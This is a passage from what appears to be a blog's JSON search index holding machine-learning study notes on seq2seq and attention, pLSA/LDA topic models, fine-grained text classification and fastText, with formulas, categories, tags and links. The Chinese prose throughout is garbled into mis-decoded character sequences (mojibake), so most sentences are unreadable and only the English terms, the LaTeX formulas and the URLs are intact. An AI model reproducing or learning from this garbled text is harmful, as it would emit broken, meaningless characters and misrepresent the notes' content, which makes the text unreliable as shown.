æçš„å®Œå–„ç¨‹åº¦è¦æ±‚å¾ˆé«˜ï¼Œéšç€æ·±åº¦å­¦ä¹ çš„å‘å±•ï¼Œç ”ç©¶ç•Œå°†æ·±åº¦å­¦ä¹ æŠ€æœ¯åº”ç”¨ä¸è‡ªç„¶è¯­è¨€çš„ç”Ÿæˆå’Œè‡ªç„¶è¯­è¨€çš„ç†è§£çš„æ–¹é¢çš„ç ”ç©¶ï¼Œå¹¶å–å¾—äº†ä¸€äº›çªç ´æ€§çš„æˆæœï¼Œæ¯”å¦‚ï¼ŒSequence-to-sequence (seq2seq) æ¨¡å‹ï¼Œè¯¥æŠ€æœ¯çªç ´äº†ä¼ ç»Ÿçš„å›ºå®šå¤§å°è¾“å…¥é—®é¢˜æ¡†æ¶ï¼Œå°†ç»å…¸æ·±åº¦ç¥ç»ç½‘ç»œæ¨¡å‹è¿ç”¨äºç¿»è¯‘ä¸èŒèƒ½é—®ç­”è¿™ä¸€ç±»åºåˆ—å‹ä»»åŠ¡ï¼Œå¹¶åœ¨å„ä¸»æµè¯­è¨€ä¹‹é—´çš„ç›¸äº’ç¿»è¯‘ä»¥åŠè¯­éŸ³åŠ©æ‰‹ä¸­äººæœºçŸ­é—®ç­”çš„åº”ç”¨ã€‚ å‚è€ƒèµ„æ–™:Visualizing A Neural Machine Translation Model 2.ç¼–ç è§£ç æ¨¡å‹ â€‹ seq2seqæ¨¡å‹ä¸ä»…ä»…æ˜¯ç”¨åœ¨NLPä¸­çš„æ¨¡å‹ï¼Œå®ƒçš„è¾“å…¥ä¹Ÿå¯ä»¥æ˜¯è¯­éŸ³ä¿¡å·æˆ–è€…å›¾åƒè¡¨ç¤ºã€‚ â€‹ åœ¨NLPçš„ä»»åŠ¡ä¸­ï¼Œå…¶å®è¾“å…¥çš„æ˜¯æ–‡æœ¬åºåˆ—ï¼Œè¾“å‡ºçš„å¾ˆå¤šæ—¶å€™ä¹Ÿæ˜¯æ–‡æœ¬åºåˆ—ã€‚ â€‹ è¿™æ˜¯ä¸€ä¸ªâ€œç¼–ç è§£ç å™¨â€ç»“æ„ï¼Œç¼–ç å™¨å¤„ç†è¾“å…¥åºåˆ—ä¸­çš„æ¯ä¸ªå…ƒç´ (åœ¨è¿™é‡Œå¯èƒ½æ˜¯1ä¸ªè¯)ï¼Œå°†æ•è·çš„ä¿¡æ¯ç¼–è¯‘æˆå‘é‡ï¼ˆç§°ä¸ºä¸Šä¸‹æ–‡å†…å®¹å‘é‡ï¼‰ã€‚åœ¨å¤„ç†æ•´ä¸ªè¾“å…¥åºåˆ—ä¹‹åï¼Œç¼–ç å™¨å°†ä¸Šä¸‹æ–‡å‘é€åˆ°è§£ç å™¨ï¼Œè§£ç å™¨é€é¡¹å¼€å§‹äº§ç”Ÿè¾“å‡ºåºåˆ—ã€‚ â€‹ åœ¨æœºå™¨ç¿»è¯‘çš„åœºæ™¯ä¸‹ï¼Œæ˜¯ä¸‹é¢è¿™æ ·çš„ã€‚ â€‹ ä¸Šä¸‹æ–‡å‘é‡å…¶å®å°±æ˜¯ â€‹ è¾“å…¥çš„æ•°æ®(æ–‡æœ¬åºåˆ—)ä¸­çš„æ¯ä¸ªå…ƒç´ (è¯)è¢«ç¼–ç æˆä¸€ä¸ªç¨ å¯†çš„å‘é‡word embedding â€‹ encoderå’Œdecoderä¸€èˆ¬ä¸ºå¾ªç¯ç¥ç»ç½‘ç»œ(RNN)ï¼Œå¾ªç¯ç¥ç»ç½‘ç»œä¼šæ¥å—æ¯ä¸ªä½ç½®(æ—¶é—´ç‚¹)ä¸Šçš„è¾“å…¥ï¼ŒåŒæ—¶ç»è¿‡å¤„ç†è¿›è¡Œä¿¡æ¯èåˆï¼Œå¹¶å¯èƒ½ä¼šåœ¨æŸäº›ä½ç½®(æ—¶é—´ç‚¹)ä¸Šè¾“å‡ºã€‚ â€‹ æ‰€ä»¥åŠ¨æ€åœ°å±•ç¤ºæ•´ä¸ªç¼–ç å™¨å’Œè§£ç å™¨ã€‚ â€‹ åœ¨æ›´å¤šçš„æ—¶å€™ï¼Œä¸ºæå‡æ•ˆæœï¼Œä¼šé‡‡ç”¨ä¸€ä¸ªå«åšæ³¨æ„åŠ›æ¨¡å‹çš„æ¨¡å‹æ¥åŠ¨æ€å¤„ç†å’Œè§£ç  â€‹ æ‰€è°“çš„æ³¨æ„åŠ›æœºåˆ¶ï¼Œå¯ä»¥ç²—ç•¥åœ°ç†è§£ä¸ºæ˜¯ä¸€ç§å¯¹äºè¾“å…¥çš„ä¿¡æ¯ï¼Œæ ¹æ®é‡è¦ç¨‹åº¦è¿›è¡Œä¸åŒæƒé‡çš„åŠ æƒå¤„ç†(é€šå¸¸åŠ æƒçš„æƒé‡æ¥æºäºsoftmaxåçš„ç»“æœ)çš„æœºåˆ¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ˜¯ä¸€ä¸ªåœ¨è§£ç é˜¶æ®µï¼Œç®€å•åœ°å¯¹ç¼–ç å™¨ä¸­çš„hidden statesè¿›è¡Œä¸åŒæƒé‡çš„åŠ æƒå¤„ç†çš„è¿‡ç¨‹ã€‚ æ›´è¯¦ç»†ä¸€ç‚¹çš„æ³¨æ„åŠ›è§£ç è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ å¸¦æ³¨æ„åŠ›çš„è§£ç å™¨RNNæ¥æ”¶çš„åµŒå…¥(embedding)å’Œä¸€ä¸ªåˆå§‹çš„è§£ç å™¨éšè—çŠ¶æ€(hidden state)ã€‚ RNNå¤„ç†è¾“å…¥ï¼Œäº§ç”Ÿæ–°çš„éšè—çŠ¶æ€å‘é‡ï¼ˆh4ï¼‰ã€‚ attentionçš„æ­¥éª¤ï¼šä½¿ç”¨ç¼–ç å™¨éšè—çŠ¶æ€(hidden state)å’Œh4å‘é‡æ¥è®¡ç®—è¯¥æ—¶é—´æ­¥é•¿çš„ä¸Šä¸‹æ–‡å‘é‡ï¼ˆC4ï¼‰ã€‚ æŠŠh4å’ŒC4æ‹¼æ¥æˆä¸€ä¸ªå‘é‡ã€‚ æŠŠæ‹¼æ¥åçš„å‘é‡è¿æ¥å…¨è¿æ¥å±‚å’Œsoftmaxå®Œæˆè§£ç  æ¯ä¸ªæ—¶é—´ç‚¹ä¸Šé‡å¤è¿™ä¸ªæ“ä½œ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸ªåŠ¨æ€è§£ç çš„è¿‡ç¨‹å±•ç¤ºæˆä¸‹è¿°å›¾æ‰€ç¤ºçš„è¿‡ç¨‹ã€‚ æ³¨æ„åŠ›æœºåˆ¶å¯ä»¥å­¦ä¹ æºè¯­è¨€å’Œç›®æ ‡è¯­è¨€ä¹‹é—´è¯å’Œè¯å¯¹é½å…³ç³»çš„æ–¹å¼ã€‚ 3.Attention â€‹ seq2seq æ˜¯ä¸€ä¸ªEncoderâ€“Decoder ç»“æ„çš„ç½‘ç»œï¼Œå®ƒçš„è¾“å…¥æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œè¾“å‡ºä¹Ÿæ˜¯ä¸€ä¸ªåºåˆ—ï¼Œ Encoder ä¸­å°†ä¸€ä¸ªå¯å˜é•¿åº¦çš„ä¿¡å·åºåˆ—å˜ä¸ºå›ºå®šé•¿åº¦çš„å‘é‡è¡¨è¾¾ï¼ŒDecoder å°†è¿™ä¸ªå›ºå®šé•¿åº¦çš„å‘é‡å˜æˆå¯å˜é•¿åº¦çš„ç›®æ ‡çš„ä¿¡å·åºåˆ—ã€‚ è¾“å…¥ï¼š \\(x = (x_1,...,x_{T_x})\\) è¾“å‡ºï¼š \\(y = (y_1,...,y_{T_y})\\) \\(h_t = RNN_{enc}(x_t, h_{t-1})\\) , Encoderæ–¹é¢æ¥å—çš„æ˜¯æ¯ä¸€ä¸ªå•è¯word embeddingï¼Œå’Œä¸Šä¸€ä¸ªæ—¶é—´ç‚¹çš„hidden stateã€‚è¾“å‡ºçš„æ˜¯è¿™ä¸ªæ—¶é—´ç‚¹çš„hidden stateã€‚ \\(s_t = RNN_{dec}(\\hat{y_{t-1}},s_{t-1})\\) ï¼Œ Decoderæ–¹é¢æ¥å—çš„æ˜¯ç›®æ ‡å¥å­é‡Œå•è¯çš„word embeddingï¼Œå’Œä¸Šä¸€ä¸ªæ—¶é—´ç‚¹çš„hidden stateã€‚ \\(c_i = \\sum_{j=1}^{T_x} \\alpha_{ij}h_j\\) , context vectoræ˜¯ä¸€ä¸ªå¯¹äºencoderè¾“å‡ºçš„hidden statesçš„ä¸€ä¸ªåŠ æƒå¹³å‡ã€‚ \\(\\alpha_{ij} = \\frac{exp(e_{ij})}{\\sum_{k=1}^{T_x}exp(e_{ik})}\\) , æ¯ä¸€ä¸ªencoderçš„hidden stateså¯¹åº”çš„æƒé‡ã€‚ \\(e_{ij} = score(s_i, h_j)\\) , é€šè¿‡decoderçš„hidden statesåŠ ä¸Šencoderçš„hidden statesæ¥è®¡ç®—ä¸€ä¸ªåˆ†æ•°ï¼Œç”¨äºè®¡ç®—æƒé‡(4) \\(\\hat{s_t} = tanh(W_c[c_t;s_t])\\), å°†context vector å’Œ decoderçš„hidden states ä¸²èµ·æ¥ã€‚ \\(p(y_t|y_{&lt;t},x) = softmax(W_s\\hat{s_t})\\) ï¼Œè®¡ç®—æœ€åçš„è¾“å‡ºæ¦‚ç‡ã€‚ â€‹ â€‹ å…¶ä¸­Encoderçš„hidden stateä¸ä¸€å®šè¦ä½œä¸ºDecoderçš„hidden stateè¾“å…¥ï¼Œå¯ä»¥å°†Decoderçš„hidden stateä»…ä»…åšå¸¸è§„åˆå§‹åŒ–ã€‚ score â€‹ ä¸€èˆ¬æœ‰ä¸‰ç§scoreçš„è®¡ç®—æ–¹æ³• ç¬¬1ç§ è¾“å…¥æ˜¯encoderçš„æ‰€æœ‰hidden states H: å¤§å°ä¸º(hid dim, sequence length)ã€‚decoderåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹ä¸Šçš„hidden stateï¼Œ sï¼š å¤§å°ä¸ºï¼ˆhid dim, 1ï¼‰ã€‚ ç¬¬ä¸€æ­¥ï¼šæ—‹è½¬Hä¸ºï¼ˆsequence length, hid dim) ä¸såšç‚¹ä¹˜å¾—åˆ°ä¸€ä¸ª å¤§å°ä¸º(sequence length, 1)çš„åˆ†æ•°ã€‚ ç¬¬äºŒæ­¥ï¼šå¯¹åˆ†æ•°åšsoftmaxå¾—åˆ°ä¸€ä¸ªåˆä¸º1çš„æƒé‡ã€‚ ç¬¬ä¸‰æ­¥ï¼šå°†Hä¸ç¬¬äºŒæ­¥å¾—åˆ°çš„æƒé‡åšç‚¹ä¹˜å¾—åˆ°ä¸€ä¸ªå¤§å°ä¸º(hid dim, 1)çš„context vectorã€‚ ç¬¬2ç§ è¾“å…¥æ˜¯encoderçš„æ‰€æœ‰hidden states H: å¤§å°ä¸º(hid dim1, sequence length)ã€‚decoderåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹ä¸Šçš„hidden stateï¼Œ sï¼š å¤§å°ä¸ºï¼ˆhid dim2, 1ï¼‰ã€‚æ­¤å¤„ä¸¤ä¸ªhidden stateçš„çº¬åº¦å¹¶ä¸ä¸€æ ·ã€‚ ç¬¬ä¸€æ­¥ï¼šæ—‹è½¬Hä¸ºï¼ˆsequence length, hid dim1) ä¸ Wa [å¤§å°ä¸º hid dim1, hid dim 2)] åšç‚¹ä¹˜ï¼Œ å†å’Œsåšç‚¹ä¹˜å¾—åˆ°ä¸€ä¸ª å¤§å°ä¸º(sequence length, 1)çš„åˆ†æ•°ã€‚ ç¬¬äºŒæ­¥ï¼šå¯¹åˆ†æ•°åšsoftmaxå¾—åˆ°ä¸€ä¸ªåˆä¸º1çš„æƒé‡ã€‚ ç¬¬ä¸‰æ­¥ï¼šå°†Hä¸ç¬¬äºŒæ­¥å¾—åˆ°çš„æƒé‡åšç‚¹ä¹˜å¾—åˆ°ä¸€ä¸ªå¤§å°ä¸º(hid dim, 1)çš„context vectorã€‚ NMTå®˜æ–¹Gitï¼šhttps://github.com/tensorflow/nmt NMTå®˜æ–¹Gitç¿»è¯‘ç‰ˆæœ¬ï¼šHTML tensorflow attention wrapperå®ç°æœºåˆ¶ ref : https://tangshusen.me/2019/03/09/tf-attention/ AttentionWrapperå®ç°ç›¸å¯¹äºç†è§£ç†è®ºæ›´å¤æ‚ä¸€äº›ã€‚ â€‹ ç®€è€Œè¨€ä¹‹ï¼Œå¢åŠ äº†attention layerï¼Œå°†attentionç®—æ³•ä¸­å¾—åˆ°çš„context vectorä¸decoderå½“å‰è¾“å‡ºcell_outputs(å³hidden state)é€šè¿‡è®¡ç®—å¾—åˆ°ä¸€ä¸ªattentionå‘é‡ã€‚å½“attention layeræ²¡æœ‰æŒ‡å®šæ—¶ï¼Œattentionå‘é‡ç›´æ¥å–context vector(å³ï¼Œç®—æ³•ç†è®ºä¸­çš„è®¡ç®—æ–¹å¼)ã€‚ â€‹ å¢åŠ äº†cell_input_fnï¼Œå°†ä¸Šä¸€æ­¥çš„attentionå‘é‡ä¸å½“å‰æ­¥çš„inputsï¼Œè”åˆæˆæ–°çš„cell_inputsã€‚ â€‹ attention mechanismï¼šè¾“å…¥decoderçš„cell_outputs(å³hidden state)ï¼Œä¸memory(encoderçš„hidden state)è®¡ç®—alignments(æƒé‡) Code Demo å¯¹è”ç”Ÿæˆ -- dir è¯—æ­Œç”Ÿæˆ -- dir","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"},{"name":"attention","slug":"attention","permalink":"https://racleray.github.io/tags/attention/"}]},{"title":"ä¸»é¢˜æ¨¡å‹","slug":"ä¸»é¢˜æ¨¡å‹","date":"2020-07-07T05:24:13.000Z","updated":"2023-08-07T11:54:31.039Z","comments":true,"path":"posts/4ede4335.html","link":"","permalink":"https://racleray.github.io/posts/4ede4335.html","excerpt":"æ­¤å¤„åªè®°å½•äº†é—®é¢˜å®šä¹‰ï¼Œç§»æ­¥ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ç¬¬äºŒç‰ˆ15-20ç« å†…å®¹è¿›è¡ŒæŸ¥é˜…ã€‚","text":"è¯¦è§ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ç¬¬äºŒç‰ˆï¼Œ15-20ç«  â€‹ ä¸»é¢˜æ¨¡å‹åœ¨ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ç¬¬äºŒç‰ˆï¼Œ15-20ç« æœ‰è¾ƒä¸ºè¯¦ç»†çš„ä»‹ç»ã€‚ pLSA â€‹ åŒ…å«â€œéšå«å˜é‡â€æˆ–è€…â€œç¼ºå¤±æ•°æ®â€çš„æ¦‚ç‡æ¨¡å‹å‚æ•°ä¼°è®¡é—®é¢˜å¯ä»¥é‡‡ç”¨EMç®—æ³•ã€‚ â€‹ EMç®—æ³•çš„æ­¥éª¤æœ¬è´¨ä¸Šæ˜¯ä¸€ç§äº¤æ›¿æœ€ä¼˜åŒ–ï¼ˆäºŒéƒ¨åæ ‡ä¸‹é™æ³•ï¼‰ï¼š Eæ­¥éª¤ï¼šæ±‚éšå«å˜é‡Givenå½“å‰ä¼°è®¡çš„å‚æ•°æ¡ä»¶ä¸‹çš„åéªŒæ¦‚ç‡ã€‚ Mæ­¥éª¤ï¼šæœ€å¤§åŒ–Complete dataå¯¹æ•°ä¼¼ç„¶å‡½æ•°çš„æœŸæœ›ï¼Œæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨Eæ­¥éª¤é‡Œè®¡ç®—çš„éšå«å˜é‡çš„åéªŒæ¦‚ç‡ï¼Œå¾—åˆ°æ–°çš„å‚æ•°å€¼ã€‚ EMç®—æ³•æ±‚è§£PLSA å·²çŸ¥é‡ï¼šw,d éšå˜é‡ï¼šz å‚æ•°ï¼šP(w|z)ï¼ŒP(z|d) E:ç›´æ¥å†™å‡º M:æ‹‰æ ¼æœ—æ—¥ä¹˜å­æ³•æ±‚è§£ LDA EMç®—æ³•æ±‚è§£LDA å·²çŸ¥é‡ï¼šw éšå˜é‡ï¼šzï¼ŒÎ¸ï¼ŒÏ† å‚æ•°ï¼šaï¼ŒÎ² E:ç›´æ¥å†™ä¸å‡ºï¼Œéœ€è¦ç”¨å˜åˆ†æ³•è¿‘ä¼¼ï¼Œæˆ–è€…å‰å¸ƒæ–¯é‡‡æ · M:åæ ‡ä¸‹é™æ³•æ±‚è§£ï¼Œå¯ä»¥è€ƒè™‘ç‰›é¡¿æ³• è¯¦è§æèˆªã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ç¬¬äºŒç‰ˆï¼Œ15-20ç« ","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"lda","slug":"lda","permalink":"https://racleray.github.io/tags/lda/"}]},{"title":"æ–‡æœ¬åˆ†ç±»advanced","slug":"æ–‡æœ¬åˆ†ç±»advanced","date":"2020-07-06T16:48:46.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/e6e273ef.html","link":"","permalink":"https://racleray.github.io/posts/e6e273ef.html","excerpt":"åšç»†ç²’åº¦æ–‡æœ¬åˆ†ç±»ä»»åŠ¡æ—¶çš„ä¸€ç‚¹è®°å½•ã€‚","text":"ç»†ç²’åº¦åˆ†ç±» å¤šæ ‡ç­¾é—®é¢˜ï¼Œæ¯ä¸€ä¸ªç±»åˆ«æ ‡ç­¾è®­ç»ƒä¸€ä¸ªåˆ†ç±»å™¨ï¼Œå¿½ç•¥äº†ä¸åŒç±»åˆ«æ ‡ç­¾é—´çš„è”ç³»ã€‚ å¤šä»»åŠ¡å­¦ä¹ ï¼Œç‰¹å¾æå–é˜¶æ®µå…±äº«å‚æ•°ï¼Œæœ€åå‡ å±‚å•ç‹¬è¾“å‡ºã€‚ä¼˜ç‚¹æ˜¯è€ƒè™‘äº†ä¸åŒä»»åŠ¡é—´çš„è”ç³»ï¼Œæœ‰è”ç³»çš„ç±»åˆ«æ ‡ç­¾å¯ä»¥ä¸€å—è®­ç»ƒï¼Œå¯¹ä¸å‡è¡¡çš„æ ·æœ¬æ•°æ®æœ‰å¢å¼ºä½œç”¨ã€‚ Seq2Seqï¼ŒæŠŠå¤šæ ‡ç­¾çš„é¢„æµ‹é—®é¢˜çœ‹æˆäº†ä¸€ä¸ªåºåˆ—åˆ°åºåˆ—çš„å­¦ä¹ ï¼Œè¿™æ ·æ—¢è€ƒè™‘äº†æ ‡ç­¾ä¹‹é—´çš„è”ç³»ï¼Œåˆå¯ä»¥å¤„ç†å¤§é‡æ ‡ç­¾çš„é—®é¢˜ã€‚ Aspect Basedï¼Œå½“æœ‰æ¯ç§Aspectï¼ˆå¯ç†è§£ä¸ºä¸»é¢˜ï¼‰ç›¸å…³ä¿¡æ¯ï¼Œä¸”æ¯ä¸ªæ ·æœ¬å±äºç‰¹å®šçš„Aspectã€‚éœ€è¦æ ¹æ®å±äºè¯†åˆ«Aspectå’Œåˆ†ç±»ã€‚ æ•°æ®å¤„ç† å¯é€‰é¡¹æœ‰ æ˜æ˜¾å™ªå£°å¤„ç†ï¼Œä¾‹å¦‚å…¨ç¯‡æ ‡ç‚¹ç¬¦å·ï¼Œç¹ä½“è½¬ç®€ä½“ç­‰ã€‚ åˆ†è¯å™¨é€‰æ‹©ä¸è‡ªå®šä¹‰è¯å…¸æ‰©å……ã€‚ä½¿ç”¨word2vecåˆå§‹åŒ–æ—¶ï¼Œè®­ç»ƒè¯å‘é‡çš„è¯è¡¨å’Œæ¨¡å‹ä½¿ç”¨çš„è¯è¡¨ä¸€è‡´ï¼ˆåˆ†è¯å™¨ä¸è¦æ··ç”¨ï¼‰ã€‚ åˆ†è¯ä¸åˆ†å­—ç‰¹å¾å¯åˆ†åˆ«åˆ©ç”¨ï¼Œè®­ç»ƒä¸åŒæ¨¡å‹é›†æˆã€‚ word2vec ä¸ bertç±»æ¨¡å‹æå–çš„ç‰¹å¾ï¼Œæ‹¼æ¥ï¼Œè¾“å…¥ä¸‹æ¸¸ä»»åŠ¡è®¾è®¡ã€‚ EDAï¼šåŒä¹‰è¯æ›¿æ¢ï¼Œéšæœºåˆ é™¤ã€äº¤æ¢ä½ç½®ç­‰ã€‚ç¿»è¯‘æ•ˆæœä¸ç¨³å®šã€‚ ä¸å¹³è¡¡æ•°æ®ï¼š ä¸Šé‡‡æ ·ï¼šç½•è§ç±»æ•°æ®éšæœºæ‰“ä¹±ä½œä¸ºæ‰©å……ã€‚åŒä¹‰è¯æ›¿æ¢ï¼Œéšæœºåˆ é™¤ã€äº¤æ¢ä½ç½®ç­‰æ‰©å……ã€‚ä½¿ç”¨æ‰©å……æ•°æ®æ—¶ï¼Œä¸è¦è¿ç»­ä½¿ç”¨å¢å¼ºåçš„æ•°æ®ï¼Œå¯ä»¥ç›¸éš”ä¸€ä¸¤ä¸ªepochä½¿ç”¨ã€‚ ä¸‹é‡‡æ ·ï¼Œæ•°æ®åˆ©ç”¨ç‡ä¸é«˜ã€‚ æ ‡ç­¾æƒé‡åŠ å…¥lossè®¡ç®—ã€‚å®é™…æ•ˆæœæ˜¯ï¼Œä¸ä¸€å®šå¸¦æ¥æé«˜ï¼Œå°¤å…¶æ˜¯å¤æ‚çš„åˆ†ç±»ä»»åŠ¡ï¼Œä½†å¯é€‰ã€‚ Label smoothingã€‚çº¦æŸç¥ç»ç½‘ç»œæœ¬èº«å¯¹é”™è¯¯æ ‡ç­¾çš„æå¤§æƒ©ç½šï¼ˆlossåœ¨bpæ—¶ï¼Œå›ä¼ ä¸€èˆ¬æ˜¯labelä¸predictä¹‹å·®ï¼‰ã€‚æé«˜æ³›åŒ–åŠ›ã€‚ focal lossã€‚æŸå¤±è®¡ç®—åå‘äºæ²¡æœ‰æ­£ç¡®åˆ†ç±»çš„è¾“å‡ºä¿®æ­£ï¼ˆç†è®ºä¸Šï¼‰ã€‚ ä½¿ç”¨é¢„è®­ç»ƒç‰¹å¾æå–å™¨æ—¶ï¼ˆEMLoï¼ŒBERTç±»ï¼‰ï¼š ä½¿ç”¨å¤–éƒ¨ç›¸ä¼¼é¢„æ–™è¿›è¡Œæ¨¡å‹pretrainã€‚ é•¿åº¦æœ‰é™åˆ¶çš„æ¨¡å‹ï¼Œå¯ä»¥å°è¯•éšæœºåˆ é™¤å¥å­ã€‚ï¼ˆè§‚æµ‹æ•°æ®ï¼Œå¦‚æœå¼€å¤´å’Œç»“å°¾é‡è¦ï¼Œå°±åˆ ä¸­é—´éƒ¨åˆ†ï¼‰ æ¨¡å‹ Bi-GRU + Multi Capsule Bi-GRU + Multi ResNet HAN + Attention Transformer Encoder + Convolutional Seq2Seq è§£ç å™¨ä¸‰ç§æ€è·¯ï¼š ä½¿ç”¨LSTMï¼ˆæˆ–å…¶ä»–ï¼‰æ¯ä¸€æ­¥ï¼ˆ#ä¸åŒç§ç±»æ ‡ç­¾æ•°ï¼‰çš„outputè¡¨ç¤ºä¸åŒç§ç±»æ ‡ç­¾çš„é¢„æµ‹è¾“å‡º Beam Searchå°½é‡å¥½çš„è¾“å‡ºé¢„æµ‹åºåˆ—ï¼ˆåªæ˜¯åœ¨inferenceé˜¶æ®µä½¿ç”¨ï¼‰ã€‚ Global Embeddingï¼ˆåœ¨è®­ç»ƒé˜¶æ®µä½¿ç”¨ï¼‰ï¼Œç±»ä¼¼Beam Searchï¼š image yä¸ºé¢„æµ‹æ ‡ç­¾åˆ†å¸ƒï¼ˆoutput softmaxåçš„è¾“å‡ºï¼‰ï¼Œeä¸ºæ¯ä¸€æ­¥ï¼ˆ#æ¯ä¸€ç§æ ‡ç­¾ï¼‰çš„outputï¼›gä¸ºglobal embeddingçš„è¾“å‡ºï¼Œä»£æ›¿LSTMçš„hidden stateï¼Œè¿›è¡Œåºåˆ—è§£ç ä»»åŠ¡ã€‚ ã€SGM: Sequence Generation Model for Multi-Label Classificationã€‘ Aspect Based Sentiment Analysis æŠ½å–contentç‰¹å¾ï¼ŒAspectä¿¡æ¯ï¼Œä½¿ç”¨å„ç§æ–¹æ³•attentionåˆ°å’Œè¾“å‡ºlabelç›¸å…³çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼š image ã€Capsule Network with Interactive Attention for Aspect-Level Sentiment Classificationã€‘ å¦ä¸€ç§æ€è·¯ï¼Œæ ‘å½¢ï¼ˆå±‚çº§æœç´¢ï¼‰ï¼š image ä¸Šå›¾ä¸­åŠ å…¥aspectä¿¡æ¯åˆ°è¾“å…¥å±‚ æ¨¡å‹è®­ç»ƒ Warm upï¼šå­¦ä¹ ç‡å…ˆå¢åŠ ï¼Œç„¶åå‡å°ã€‚çº¿æ€§å¢åŠ å³å¯ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨one cycle fittingï¼Œè®©å­¦ä¹ ç‡åœ¨ä¸€ä¸ªepochå†…ï¼Œçº¿æ€§å¢åŠ åˆ°ä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œç„¶åçº¿æ€§å‡å°ä¸ºåˆå§‹çš„è¾ƒå°å­¦ä¹ ç‡ã€‚ç»˜åˆ¶loss--lræ›²çº¿å›¾ï¼Œæ‘˜åˆ°lossçš„å˜åŒ–è¾ƒå¤§å¤„çš„lrçš„ååˆ†ä¹‹ä¸€ã€‚ã€A DISCIPLINED APPROACH TO NEURAL NETWORK HYPER-PARAMETERS: PART 1 â€“ LEARNING RATE, BATCH SIZE, MOMENTUM, AND WEIGHT DECAYã€‘ æ‰¾åˆ°åˆé€‚å­¦ä¹ ç‡åï¼ˆå®éªŒï¼‰ï¼Œ å°†æ¨¡å‹è¿­ä»£è¶³å¤Ÿå¤šæ¬¡ï¼ˆlosså¯èƒ½åœ¨ä¸€æ®µæ—¶é—´ä¸é™ä¹‹åï¼Œçªç„¶ä¸‹é™ï¼‰ï¼Œä¿ç•™éªŒè¯æ­£ç¡®ç‡æœ€é«˜çš„æ¨¡å‹ã€‚åŠ è½½ä¸Šä¸€ä¸ªæœ€ä¼˜æ¨¡å‹ï¼Œå­¦ä¹ ç‡è®¾ä¸ºå½“å‰1/10ï¼ˆå®éªŒï¼‰ï¼Œç»§ç»­è®­ç»ƒæ¨¡å‹ï¼Œä¿ç•™éªŒè¯æ­£ç¡®ç‡æœ€é«˜çš„æ¨¡å‹ã€‚åŠ è½½ä¸Šä¸€ä¸ªæœ€ä¼˜æ¨¡å‹ï¼Œå»æ‰æ­£åˆ™åŒ–ç­–ç•¥(dropout ç­‰ï¼Œå¦‚æœæœ‰)ï¼Œå­¦ä¹ ç‡å†é™ä½ï¼Œè®­ç»ƒåˆ°æ”¶æ•›ã€‚ å…ˆè°ƒæ•´å­¦ä¹ ç‡ï¼Œå†è°ƒæ•´å…¶ä»–æ¨¡å‹è¶…å‚æ•°ã€‚ sequenceæ¨¡å‹ï¼Œåºåˆ—é•¿åº¦è¦é€‰å–åˆé€‚ã€‚ä¸æŸå¤±å¤ªå¤šä¿¡æ¯ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fine-grained","slug":"fine-grained","permalink":"https://racleray.github.io/tags/fine-grained/"},{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"}]},{"title":"æ–‡æœ¬åˆ†ç±»æ·±åº¦å­¦ä¹ æ–¹æ³•","slug":"æ–‡æœ¬åˆ†ç±»æ·±åº¦å­¦ä¹ æ–¹æ³•","date":"2020-07-06T16:34:54.000Z","updated":"2023-08-07T11:54:31.044Z","comments":true,"path":"posts/bc7ffed8.html","link":"","permalink":"https://racleray.github.io/posts/bc7ffed8.html","excerpt":"æ•´ç†CNNã€RNNã€fastTextç­‰æ¨¡å‹åœ¨æ–‡æœ¬åˆ†ç±»ä¸­çš„åº”ç”¨ã€‚","text":"fastText â€‹ å®˜æ–¹Git â€‹ fastTextæ˜¯Facebook AI Researchåœ¨16å¹´å¼€æºçš„ä¸€ä¸ªæ–‡æœ¬åˆ†ç±»å™¨ã€‚ å…¶ç‰¹ç‚¹å°±æ˜¯fastã€‚ç›¸å¯¹äºå…¶å®ƒæ–‡æœ¬åˆ†ç±»æ¨¡å‹ï¼Œå¦‚SVMï¼ŒLogistic Regressionå’Œneural networkç­‰æ¨¡å‹ï¼ŒfastTextåœ¨ä¿æŒåˆ†ç±»æ•ˆæœçš„åŒæ—¶ï¼Œå¤§å¤§ç¼©çŸ­äº†è®­ç»ƒæ—¶é—´ã€‚ é€‚åˆå¤§å‹æ•°æ®+é«˜æ•ˆçš„è®­ç»ƒé€Ÿåº¦ï¼šåœ¨ä½¿ç”¨æ ‡å‡†å¤šæ ¸CPUçš„æƒ…å†µä¸‹10åˆ†é’Ÿå†…å¤„ç†è¶…è¿‡10äº¿ä¸ªè¯ æ”¯æŒå¤šè¯­è¨€è¡¨è¾¾ï¼šåˆ©ç”¨å…¶è¯­è¨€å½¢æ€ç»“æ„ï¼ŒfastTextèƒ½å¤Ÿè¢«è®¾è®¡ç”¨æ¥æ”¯æŒåŒ…æ‹¬è‹±è¯­ã€å¾·è¯­ã€è¥¿ç­ç‰™è¯­ã€æ³•è¯­ä»¥åŠæ·å…‹è¯­ç­‰å¤šç§è¯­è¨€ã€‚ 